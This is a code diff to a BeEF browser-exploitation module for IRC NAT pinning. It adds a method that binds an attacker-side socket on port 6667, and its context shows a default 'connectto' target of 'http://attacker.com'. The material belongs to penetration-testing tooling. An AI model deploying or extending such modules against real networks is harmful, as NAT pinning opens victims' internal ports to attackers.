@@ -14,7 +14,11 @@
 #   limitations under the License.
 #
 class Irc_nat_pinning < BeEF::Core::Command
-  
+
+  def pre_send
+    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_socket("IRC", "0.0.0.0", 6667)
+  end
+
   def self.options
     return [
         {'name'=>'connectto', 'ui_label' =>'Connect to','value'=>'http://attacker.com'},
@@ -25,8 +29,11 @@ class Irc_nat_pinning < BeEF::Core::Command
   
   def post_execute
     return if @datastore['result'].nil?
-    
     save({'result' => @datastore['result']})
+
+    #todo antisnatchor: how long should we leave it open? Maybe default timeout of 30 seconds?
+    #BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind_socket("IRC")
+
   end
   
 end
